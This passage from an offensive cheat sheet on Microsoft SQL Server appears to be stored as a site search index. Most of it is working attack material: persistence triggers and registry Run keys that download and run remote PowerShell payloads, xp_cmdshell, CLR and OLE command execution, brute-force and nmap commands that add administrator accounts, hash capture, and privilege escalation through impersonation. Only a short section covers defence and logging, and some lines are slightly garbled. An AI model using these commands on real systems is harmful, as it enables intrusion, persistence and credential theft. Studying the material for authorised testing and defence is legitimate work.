( id , ExecIsStartUp ) = 1 ; Triggers References: https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql Data Definition Language (DDL) Triggers Execute under the context of the user that calls the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups CREATE Trigger [ persistence_ddl_1 ] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO Data Manipulation Language (DML) Triggers Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers USE master GRANT IMPERSONATE ON LOGIN :: sa to [ Public ]; USE testdb CREATE TRIGGER [ persistence_dml_1 ] ON testdb . dbo . datatable FOR INSERT , UPDATE , DELETE AS EXECUTE AS LOGIN = sa EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO Logon Triggers Ideal for triggering with a logon failure of a low-privilege user. References: https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers CREATE Trigger [ persistence_logon_1 ] ON ALL SERVER WITH EXECUTE AS sa FOR LOGON AS BEGIN IF ORIGINAL_LOGIN () = testuser EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) END ; List all Triggers SELECT - FROM sys . server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose Registry keys xp_regwrite Needs sysadmin EXEC xp_regwrite @ rootkey = HKEY_LOCAL_MACHINE , @ key = Software\\Microsoft\\Windows\\CurrentVersion\\Run , @ value_name = SQLServerUpdate , @ type = REG_SZ , @ value = powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman . exe -Command c:\\windows\\system32\\cmd.exe -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) -Verbose xp_regread Limited read for public role References: https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ DECLARE @ Reg_Value VARCHAR ( 1000 ) EXECUTE xp_regread HKEY_LOCAL_MACHINE , SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion , \u2018 ProductName , @ Reg_Value OUTPUT SELECT @ Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose xp_regdeletekey Needs sysadmin References: https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal Defence Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program - Files \\ Microsoft SQL Server \\ MSSQL . 1 MSSQL \\ LOG \\ ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution) References https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"Databases - SqlServer"},{"location":"databases-sqlserver/#databases-sqlserver","text":"","title":"Databases - SqlServer"},{"location":"databases-sqlserver/#quick-reference","text":"mssql-sql-injection-cheat-sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet SQL Server UNC Path Injection Cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Brute-forcing: hydra - l sa \u2013 P / path / to / rockyou . txt 10 . 10 . 10 . 125 mssql Nmap Enumeration: nmap \u2013script ms-sql and not ms-sql-brute \u2013script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all -d -oN mssql.nmap -Pn -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1434 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net user walter P@ssWORD1234 /add 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net localgroup administrators walter /add 10 .33.1.33 nmap -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1433 \u2013script ms-sql-query \u2013script-args mssql.username = sa,mssql.password = password,mssql.database = bankdb,ms-sql-query.query = SELECT * FROM tblCustomers 10 .33.1.33 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER $ip Capture hash: Run responder and do: xp_dirtree \\\\10.10.14.8\\test List all databases EXEC sp_databases ; select * from sysobjects where xtype = U ; Connect from Linux: sqsh - S someserver - U sa - P poiuytrewq - D bankdb Special Schemas: INFORMATION_SCHEMA sys DB Structure: SELECT name FROM master . dbo . sysdatabases SELECT * FROM orcharddb . INFORMATION_SCHEMA . SELECT * FROM orcharddb . INFORMATION_SCHEMA . COLUMNS SQL Injection Tips: Commenting: -- Important functions xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems +EXEC+master.sys.xp_dirtree+ \\\\ 10 . 10 . 14 . 9 \\ share -- Time based injection if (select user) = sa waitfor delay 0 : 0 : 5 -- if (select user) != sa waitfor delay 0 : 0 : 5 --","title":"Quick Reference"},{"location":"databases-sqlserver/#tools","text":"SQSH Accessing and Hacking MSSQL from Backtrack Linux Installation: apt - get install sqsh freetds - bin freetds - common freetds - dev Edit / etc / freetds / freetds . conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/ . sqshrc : \\ set username = sa \\ set password = password \\ set style = vert Run: sqsh - S MyServer sqsh - S { system name / IP } : { port num } - U { username } - P { password } List of available databases with: SELECT name FROM master .. sysdatabases go Build from source: $export SYBASE = /usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin","title":"Tools"},{"location":"databases-sqlserver/#roles-and-permissions","text":"","title":"Roles and Permissions"},{"location":"databases-sqlserver/#principals","text":"Principals are entities that can request SQL Server resources. SQL Server-level principals: SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role Database-level principals: Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST ; ) Database Role Application Role","title":"Principals"},{"location":"databases-sqlserver/#server-level-roles-and-permissions","text":"Fixed Roles sysadmin - Can perform any activity in the server. serveradmin - Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin - Can end processes that are running in an instance of SQL Server. setupadmin - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.) bulkadmin - Can run the BULK INSERT statement. diskadmin - Used for managing disk files. dbcreator - Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017 Working with Server-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles","title":"Server-Level Roles and Permissions"},{"location":"databases-sqlserver/#database-level-roles-and-permissions","text":"CREATE LOGIN ... WITH PASSWORD = ...; Fixed Roles db_owner Can perform all configuration and maintenance activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator - Can back up the database. db_ddladmin - Can run any Data Definition Language (DDL) command. db_datawriter - Can add, delete, or change data in all user tables. db_datareader - Can read all data from all user tables. db_denydatawriter - Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader - Cannot read any data in the user tables within a database. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017 Special Roles for SQL Database and SQL Data Warehouse Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager - Can create and delete logins in the virtual master database. Special Roles for msdb Database db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin - may be able to elevate their privileges to sysadmin [1] dc_admin dc_operator dc_proxy - Can administer and use the data collector. dc_admin may be able to elevate their privileges to sysadmin . [1] PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. ServerGroupAdministratorRole ServerGroupReaderRole - Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor . Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles Special Roles for R Services rpkgs - users - Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs - private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs - shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages. Working with Database-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles","title":"Database Level Roles and Permissions"},{"location":"databases-sqlserver/#application-roles","text":"Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole","title":"Application Roles"},{"location":"databases-sqlserver/#enumeration","text":"Direct Access SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient) Modules PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Discovery PowerUpSQL: Get - SQLInstanceScanUDP - ComputerName 192 . 168 . 1 . 2 - verbose .NET (UDP Broadcast): [ System . Data . Sql . SqlDataSourceEnumeration ]:: Instance . GetDataSources () Local Enumeration http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/ Import-Module -Name SQLPS Get-ChildItem SQLSERVER : \\ SQL \\ machinename Get-Service -Name MSSQL * sqlinstances = Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server foreach ( $SQLInstance in $SQLInstances ) { foreach ( $s in $SQLInstance . InstalledInstances ) { [PSCustomObject] @{ PSComputerName = $SQLInstance . PSComputerName InstanceName = $s }}} Get-SQLInstanceLocal Domain Enumeration Search AD user attribute: servicePrincipalName = MSSQL * Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object { $_ . is_encrypted -eq \u201c True } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose","title":"Enumeration"},{"location":"databases-sqlserver/#queries","text":"Version: SELECT @@version Current User: SELECT SUSER_SNAME () SELECT SYSTEM_USER Current Role: SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT user Current Database: SELECT db_name () List All Databases: SELECT name FROM master .. sysdatabases List All Logins: SELECT - FROM sys . server_principals WHERE type_desc != SERVER_ROLE List All Users for Database: SELECT - FROM sys . database_principals WHERE type_desc != DATABASE_ROLE List All Sysadmins: SELECT name , type_desc , is_disabled FROM sys . server_principals WHERE IS_SRVROLEMEMBER ( sysadmin , name ) = 1 List All Roles: SELECT DP1 . name AS DatabaseRoleName , isnull ( DP2 . name , No members ) AS DatabaseUserName FROM sys . database_role_members AS DRM RIGHT OUTER JOIN sys . database_principals AS DP1 ON DRM . role_principal_id = DP1 . principal_id LEFT OUTER JOIN sys . database_principals AS DP2 ON DRM . member_principal_id = DP2 . principal_id WHERE DP1 . type = R ORDER BY DP1 . name ; Effective Permissions for Server: SELECT - FROM fn_my_permissions ( NULL , SERVER ); Effective Permissions for Database: SELECT - FROM fn_my_permissions ( NULL , DATABASE ); Active User Tokens: SELECT - FROM sys . user_token Active Login Tokens: SELECT - FROM sys . login_token Impersonatable Accounts: SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Find Trustworthy Databases: SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql","title":"Queries"},{"location":"databases-sqlserver/#brute-forcing","text":"Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas / noprofile / netonly / user : domain \\ username powershell . exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013 Verbose -- Above is equivalent to: SELECT SUER_NAME ( 1 ) SELECT SUER_NAME ( 2 ) SELECT SUER_NAME ( 3 ) BruteForce: Get-SQLInstanceDomain | G ) et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $( Get-SQLInstanceDomain ). ComputerName comps | Invoke-BruteForce -UserList C : \\ dict \\ users . txt -PasswordList C : \\ dict \\ passwords . txt -Service SQL \u2013 Verbose","title":"Brute-forcing"},{"location":"databases-sqlserver/#command-execution","text":"","title":"Command Execution"},{"location":"databases-sqlserver/#xp_cmdshell","text":"Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc xp_cmdshell , xplog70.dll Execute command: EXEC master .. xp_cmdshell whoami xp_cmdshell powershell iex ( New - Object System . Net . WebClient ). DownloadString ( \\ http://10.10.14.8/shell.ps1\\ ) Enable xp_cmdshell: mssqlclient . py has enable_xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 1 RECONFIGURE Disable xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 0 RECONFIGURE Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell: -- add user test to the master database USE [ master ] GO CREATE USER [ test ] FOR LOGIN [ test ] GO -- grant execute access to xp_cmdshell GRANT EXEC ON xp_cmdshell TO [ test ] Nishang: Execute - Command - MSSQL - ComputerName instance - UserName sa - Password pw PowerUpSQL: Invoke - SQLOSCmd - Username sa - Password pw - Instance instance - Command whoami","title":"xp_cmdshell"},{"location":"databases-sqlserver/#custom-extended-stored-procedures","text":"DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc . dll has a function called xp_calc :\\ sp_addextendedproc xp_calc , C:\\mydll\\xp_calc.dll EXEC xp_calc sp_dropextendedproc xp_calc Create-SQLFileXpDll -OutFile C : \\ fileserver \\ xp_calc . dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc xp_calc , \\\\192.168.15.2\\fileserver\\xp_calc.dll Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing Custom Extended Stored Procedures: Get-SQLStoredProcedureXP -Instance instance -Verbose","title":"Custom Extended Stored Procedures"},{"location":"databases-sqlserver/#custom-clr-assemblies","text":"CLR ( Common Language Runtime ) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path References https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure show advanced options , 1 RECONFIGURE GO -- Enable clr on the server sp_configure clr enabled , 1 RECONFIGURE GO Create DLL: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe / target : library C : \\ Users \\ labuser \\ Desktop \\ cmd_exec . cs Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C : \\ Users \\ labuser \\ Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM \\\\192.168.15.2\\fileserver\\cmd_exec.dll WITH PERMISSION_SET = UNSAFE ; GO Import the assembly from string: CREATE ASSEMBLY [ NMfsa ] AUTHORIZATION [ dbo ] FROM 0 x4D5A90 ...... Link the assembly to a stored procedure CREATE PROCEDURE [ dbo ].[ cmd_exec ] @ execCommand NVARCHAR ( 4000 ) AS EXTERNAL NAME [ my_assembly ].[ StoredProcedures ].[ cmd_exec ]; GO Execution: cmd_exec whoami Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose","title":"Custom CLR Assemblies"},{"location":"databases-sqlserver/#ole-automation-procedure","text":"Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. References: https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure show advanced options , 1 ; GO RECONFIGURE ; GO sp_configure Ole Automation Procedures , 1 ; GO RECONFIGURE ; GO Execute: DECLARE @ output INT DECLARE @ ProgramToRun VARCHAR ( 255 ) SET @ ProgramToRun = Run( calc.exe ) EXEC sp_oacreate wScript.Shell , @ output out EXEC sp_oamethod @ output , @ ProgramToRun EXEC sp_oadestroy @ output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/ -- Declare variables used to reference the objects DECLARE @ objLocator int , @ objWmi int , @ objPermiss int , @ objFull int ; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate WbemScripting.SWbemLocator , @ objLocator OUTPUT ; -- Use the SWbemLocator object s ConnectServer() method to connect to the -- local WMI server. The connection will be to the root\\cimv2 namespace EXEC sp_OAMethod @ objLocator , ConnectServer , @ objWmi OUTPUT , . , root\\cimv2 ; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for ftp.exe EXEC sp_OAMethod @ objWmi , Get , @ objPermiss OUTPUT , Win32_LogicalFileSecuritySetting.Path= ftp.exe ; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @ objWmi , Get , @ objFull OUTPUT , Win32_SecurityDescriptor ; -- Set the SecurityDescriptor s ControlFlags property to -- 4 (SE_DACL_PRESENT) EXEC sp_OASetProperty @ objFull , ControlFlags , 4 ; -- Set the file security setting object s security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @ objPermiss , SetSecurityDescriptor , NULL , @ objFull ;","title":"OLE Automation Procedure"},{"location":"databases-sqlserver/#agent-jobs-cmdexec-powershell-activex-etc","text":"Job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. References: https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent https://serverfault.com/a/14569 https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution Steps xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job Listing all Jobs** SELECT job . job_id , notify_level_email , name , enabled , description , step_name , command , server , database_name FROM msdb . dbo . sysjobs job INNER JOIN msdb . dbo . sysjobsteps steps ON job . job_id = steps . job_id Interesting subsystems (job types): PowerShell USE msdb EXEC dbo . sp_add_job @ job_name = N PSJob EXEC sp_add_jobstep @ job_name = N PSJob , @ step_name = N test_powershell_name1 , @ subsystem = N PowerShell , @ command = N powershell.exe -noexit ps , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N PSJob EXEC dbo . sp_start_job N PSJob -- EXEC dbo.sp_delete_job @job_name = N PSJob CmdExec USE msdb EXEC dbo . sp_add_job @ job_name = N cmdjob EXEC sp_add_jobstep @ job_name = N cmdjob , @ step_name = N test_cmd_name1 , @ subsystem = N cmdexec , @ command = N cmd.exe /k calc , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N cmdjob EXEC dbo . sp_start_job N cmdjob ; -- EXEC dbo.sp_delete_job @job_name = N cmdJob Microsoft ActiveX Script (VBScript and Jscript) SSIS (SQL Server Integrated Services) PowerUpSQL Invoke-SQLOSCmdAgentJob \u2013 Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe ] se","title":"Agent Jobs (CmdExec, PowerShell, ActiveX etc.)"},{"location":"databases-sqlserver/#external-scripting","text":"R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). References: https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure external scripts enabled GO EXEC sp_execute_external_script @ language = N R , @ script = N OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T)) WITH RESULT SETS (([ cmd_out ] text )); GO Grab Net-NTLM hashes with R: @ script = N .libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x ) Using shell instead of system: https://pastebin.com/zBDnzELT @ script = N OutputDataSet - data.frame(shell( dir ,intern=T)) Executing commands with Python: EXEC sp_execute_external_script @ language = N Python , @ script = N import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )]) WITH RESULT SETS (([ cmd_out ] nvarchar ( max ))) PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose","title":"External Scripting"},{"location":"databases-sqlserver/#registry-autoruns","text":"","title":"Registry Autoruns"},{"location":"databases-sqlserver/#file-autoruns","text":"","title":"File Autoruns"},{"location":"databases-sqlserver/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"databases-sqlserver/#find-impersonatable-accounts","text":"https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose","title":"Find Impersonatable Accounts"},{"location":"databases-sqlserver/#execute-as","text":"https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () EXECUTE AS LOGIN = sa SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN ()","title":"Execute As"},{"location":"databases-sqlserver/#trustworthy-databases","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . Discover Trustworthy Databases SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose Exploitation Add sysadmin to myuser : EXECUTE AS USER = dbo SELECT system_user EXEC sp_addsrvrolemember example.com\\myuser , sysadmin","title":"Trustworthy Databases"},{"location":"databases-sqlserver/#public-to-service-account","text":"UNC Path Injection Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Invoke-SQLUncPathInjection -Verbose -CaptureIp 192 . 168 . 1 . 11","title":"Public to Service Account"},{"location":"databases-sqlserver/#service-account-to-system","text":"Rotten Potato https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. Extracting service account credentials from LSA Secrets and/or memory Token Impersonation for the SQL Server service Single user mode","title":"Service Account to System"},{"location":"databases-sqlserver/#lateral-movement","text":"","title":"Lateral Movement"},{"location":"databases-sqlserver/#domain-user-accounts","text":"SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get - SQLInstanceDomain | Get - SQLServerInfo - Verbose For alternative credentials: runas / noprofile / netonly / user : domain \\ username powershell . exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests: Get - SQLFuzzDomainAccount - Instance instance - StartId 500 - EndId 2000 - Verbose If local admin rights are present, dump credentials. References: https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/","title":"Domain User accounts"},{"location":"databases-sqlserver/#database-links","text":"Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests References: https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine 